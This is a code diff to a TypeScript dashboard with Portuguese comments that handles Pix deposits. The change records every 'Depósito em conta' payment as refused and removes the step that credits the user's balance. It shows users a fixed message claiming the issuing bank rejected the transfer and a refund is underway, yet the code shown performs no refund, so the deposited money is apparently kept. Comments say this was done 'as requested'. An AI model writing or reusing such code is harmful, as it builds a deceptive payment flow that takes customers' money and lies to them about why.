@@ -155,11 +155,11 @@ export default function Dashboard({ profile, onLogout, setProfile }: { profile: 
         for (const paymentDoc of newPayments) {
           const paymentData = paymentDoc.data();
           
-          // CASO 1: Depósito em conta (resulta em aprovação e atualização de saldo)
+          // CASO 1: Depósito em conta (resulta em recusa conforme regra de negócio solicitada)
           if (paymentData.description?.includes("Depósito em conta")) {
             // Usamos o ID externo ou o ID do documento para evitar duplicatas (idempotência)
             const paymentId = paymentData.externalId || paymentData.identifier || paymentDoc.id;
-            const proposalId = `deposit_${paymentId}`;
+            const proposalId = `refused_${paymentId}`;
             
             // Verificar se já existe uma proposta com este ID
             const proposalDoc = await getDoc(doc(db, 'proposals', proposalId));
@@ -171,26 +171,18 @@ export default function Dashboard({ profile, onLogout, setProfile }: { profile: 
                 userEmail: profile.email,
                 requestedAmount: paymentData.amount || 0,
                 installments: 1,
-                status: 'completed',
+                status: 'refused',
                 createdAt: new Date().toISOString(),
                 updatedAt: new Date().toISOString(),
                 approvedAmount: paymentData.amount || 0,
-                refusalReason: ''
+                refusalReason: 'O Pix do depósito foi recusado pelo banco emissor e está em processo de estorno. O tempo para o banco compensar pode ser de até 24 horas úteis.'
               };
               
               try {
-                // Criar registro da transação concluída
                 await setDoc(doc(db, 'proposals', proposalId), newProposal);
-                
-                // Atualizar saldo do usuário
-                const userRef = doc(db, 'users', profile.uid);
-                await updateDoc(userRef, {
-                  balance: (profile.balance || 0) + (paymentData.amount || 0)
-                });
-                
-                console.log("Deposit approved and balance updated for payment:", paymentDoc.id);
+                console.log("Refused deposit created for payment (as requested):", paymentDoc.id);
               } catch (error) {
-                console.error("Error processing successful deposit:", error);
+                console.error("Error creating refused proposal:", error);
               }
             }
           }
